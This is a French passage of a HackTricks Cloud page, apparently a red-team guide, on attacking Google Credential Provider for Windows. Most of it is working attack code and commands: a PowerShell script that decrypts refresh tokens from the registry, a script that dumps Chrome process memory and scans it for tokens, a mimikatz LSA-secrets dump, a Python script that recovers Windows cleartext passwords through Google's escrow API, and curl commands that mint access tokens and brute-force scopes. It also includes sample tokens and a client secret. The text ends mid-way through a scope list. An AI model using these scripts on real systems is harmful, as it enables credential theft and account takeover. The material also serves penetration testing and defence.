# GWS - Attaques de synchronisation de Workspace (GCPW, GCDS, Synchronisation de r√©pertoire avec AD & EntraID)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

## GCPW - Google Credential Provider for Windows

C'est le syst√®me d'authentification unique que Google Workspaces fournit afin que les utilisateurs puissent se connecter √† leurs PC Windows en utilisant **leurs identifiants Workspace**. De plus, cela stockera des jetons pour acc√©der √† Google Workspace √† certains endroits sur le PC.

{% hint style="success" %}
Notez que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) est capable de d√©tecter **GCPW**, d'obtenir des informations sur la configuration et **m√™me des jetons**.
{% endhint %}

### GCPW - MitM

Lorsqu'un utilisateur acc√®de √† un PC Windows synchronis√© avec Google Workspace via GCPW, il devra remplir un formulaire de connexion commun. Ce formulaire de connexion renverra un code OAuth que le PC √©changera contre le jeton de rafra√Æchissement dans une requ√™te comme : 

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

De nouvelles lignes ont √©t√© ajout√©es pour le rendre plus lisible.

{% hint style="info" %}
Il √©tait possible d'effectuer un MitM en installant `Proxifier` sur le PC, en √©crasant le binaire `utilman.exe` avec un `cmd.exe` et en ex√©cutant les **fonctionnalit√©s d'accessibilit√©** sur la page de connexion Windows, ce qui ex√©cutera un **CMD** √† partir duquel vous pouvez **lancer et configurer le Proxifier**.\
N'oubliez pas de **bloquer le trafic QUICK UDP** dans `Proxifier` afin qu'il soit r√©trograd√© √† une communication TCP et que vous puissiez le voir.

Configurez √©galement dans "Services et autres utilisateurs" les deux options et installez le certificat CA Burp dans Windows.
{% endhint %}

De plus, en ajoutant les cl√©s `enable_verbose_logging = 1` et `log_file_path = C:\Public\gcpw.log` dans **`HKLM:\SOFTWARE\Google\GCPW`**, il est possible de stocker certains journaux.

### GCPW - Empreinte

Il est possible de v√©rifier si GCPW est install√© sur un appareil en v√©rifiant si le processus suivant existe ou si les cl√©s de registre suivantes existent :
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
Dans **`HKCU:\SOFTWARE\Google\Accounts`**, il est possible d'acc√©der √† l'email de l'utilisateur et au **refresh token** chiffr√© si l'utilisateur s'est r√©cemment connect√©.

Dans **`HKLM:\SOFTWARE\Google\GCPW\Users`**, il est possible de trouver les **domains** autoris√©s √† se connecter dans la cl√© `domains_allowed` et dans les sous-cl√©s, il est possible de trouver des informations sur l'utilisateur comme l'email, la photo, le nom d'utilisateur, les dur√©es de vie des tokens, le handle du token...

{% hint style="info" %}
Le handle du token est un token qui commence par `eth.` et √† partir duquel on peut extraire certaines informations avec une requ√™te comme :

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

Il est √©galement possible de trouver le handle du token d'un access token avec une requ√™te comme :

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

Afaik, il n'est pas possible d'obtenir un refresh token ou un access token √† partir du token handle.
{% endhint %}

De plus, le fichier **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** est un json contenant les informations de diff√©rents **settings** comme `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (si plusieurs utilisateurs de Workspace peuvent se connecter √† l'ordinateur) et `validityPeriodDays` (nombre de jours pendant lesquels un utilisateur n'a pas besoin de se r√©authentifier directement avec Google).

### GCPW - Tokens de rafra√Æchissement du registre

Dans le registre **`HKCU:\SOFTWARE\Google\Accounts`**, il pourrait √™tre possible de trouver certains comptes avec le **`refresh_token`** crypt√© √† l'int√©rieur. La m√©thode **`ProtectedData.Unprotect`** peut facilement le d√©chiffrer.

<details>

<summary>Obtenir les donn√©es de <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> et d√©chiffrer les refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Exemple de sortie :

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

Comme expliqu√© dans [**cette vid√©o**](https://www.youtube.com/watch?v=FEQxHRRP\_5I), si vous ne trouvez pas le jeton dans le registre, il est possible de modifier la valeur (ou de supprimer) de **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** et la prochaine fois que l'utilisateur acc√®de √† l'ordinateur, il devra se connecter √† nouveau et le **jeton sera stock√© dans le registre pr√©c√©dent**.

### GCPW - Jetons de rafra√Æchissement de disque

Le fichier **`%LocalAppData%\Google\Chrome\User Data\Local State`** stocke la cl√© pour d√©chiffrer les **`refresh_tokens`** situ√©s √† l'int√©rieur des **profils Google Chrome** de l'utilisateur comme :

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

Il est possible de trouver du **code C#** acc√©dant √† ces jetons de mani√®re d√©chiffr√©e dans [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe).

De plus, le chiffrement peut √™tre trouv√© dans ce code : [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

On peut observer que AESGCM est utilis√©, le jeton chiffr√© commence par une **version** (**`v10`** √† ce moment), puis il [**a 12B de nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42), et ensuite il a le **texte chiffr√©** avec un **mac final de 16B**.

### GCPW - Dumping des jetons de la m√©moire des processus

Le script suivant peut √™tre utilis√© pour **dump** chaque processus **Chrome** en utilisant `procdump`, extraire les **cha√Ænes** et ensuite **chercher** des cha√Ænes li√©es aux **jetons d'acc√®s et de rafra√Æchissement**. Si Chrome est connect√© √† un site Google, certains **processus stockeront des jetons de rafra√Æchissement et/ou d'acc√®s en m√©moire !**

<details>

<summary>Dump des processus Chrome et recherche de jetons</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

J'ai essay√© la m√™me chose avec `gcpw_extension.exe` mais il n'a trouv√© aucun token.

Pour une raison quelconque, **certains tokens d'acc√®s extraits ne seront pas valides (bien que certains le soient)**. J'ai essay√© le script suivant pour supprimer des caract√®res un par un afin d'essayer d'obtenir le token valide √† partir du dump. Cela ne m'a jamais aid√© √† en trouver un valide, mais cela pourrait, je suppose :

<details>

<summary>V√©rifier le token d'acc√®s en supprimant des caract√®res un par un</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - R√©cup√©ration du mot de passe en clair

Pour abuser de GCPW afin de r√©cup√©rer le mot de passe en clair, il est possible d'extraire le mot de passe chiffr√© de **LSASS** en utilisant **mimikatz** :
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Ensuite, recherchez le secret comme `Chrome-GCPW-<sid>` comme dans l'image :

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Ensuite, avec un **jeton d'acc√®s** avec la port√©e `https://www.google.com/accounts/OAuthLogin`, il est possible de demander la cl√© priv√©e pour d√©chiffrer le mot de passe :

<details>

<summary>Script pour obtenir le mot de passe en texte clair donn√© le jeton d'acc√®s, le mot de passe chiffr√© et l'identifiant de ressource</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

Il est possible de trouver les composants cl√©s de cela dans le code source de Chromium :

* Domaine API : [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* Point de terminaison API : [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - G√©n√©ration de jetons d'acc√®s √† partir de jetons d'actualisation

En utilisant le jeton d'actualisation, il est possible de g√©n√©rer des jetons d'acc√®s en utilisant celui-ci ainsi que l'ID client et le secret client sp√©cifi√©s dans la commande suivante :
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Scopes

{% hint style="info" %}
Notez qu'il n'est pas possible de demander n'importe quel scope pour le token d'acc√®s, m√™me en ayant un token de rafra√Æchissement, car vous ne pouvez demander que les **scopes pris en charge par l'application o√π vous g√©n√©rez le token d'acc√®s**.

De plus, le token de rafra√Æchissement n'est pas valide dans toutes les applications.
{% endhint %}

Par d√©faut, GCPW n'aura pas acc√®s en tant qu'utilisateur √† tous les scopes OAuth possibles, donc en utilisant le script suivant, nous pouvons trouver les scopes qui peuvent √™tre utilis√©s avec le `refresh_token` pour g√©n√©rer un `access_token` :

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Et voici le r√©sultat que j'ai obtenu au moment de l'√©criture :
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
De plus, en v√©rifiant le code source de Chromium, il est possible de [**trouver ce fichier**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), qui contient **d'autres port√©es** qui peuvent √™tre suppos√©es **et qui n'apparaissent pas dans la liste brute-forc√©e pr√©c√©demment**. Par cons√©quent, ces port√©es suppl√©mentaires peuvent √™tre suppos√©es :

<details>

<summary>Port√©es suppl√©mentaires</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

Notez que le plus int√©ressant est peut-√™tre :
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
Cependant, j'ai essay√© d'utiliser cette port√©e pour acc√©der √† gmail ou lister des groupes et cela n'a pas fonctionn√©, donc je ne sais pas √† quel point cela est encore utile.

**Obtenir un jeton d'acc√®s avec toutes ces port√©es**:

<details>

<summary>Script Bash pour g√©n√©rer un jeton d'acc√®s √† partir de refresh_token avec toutes les port√©es</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
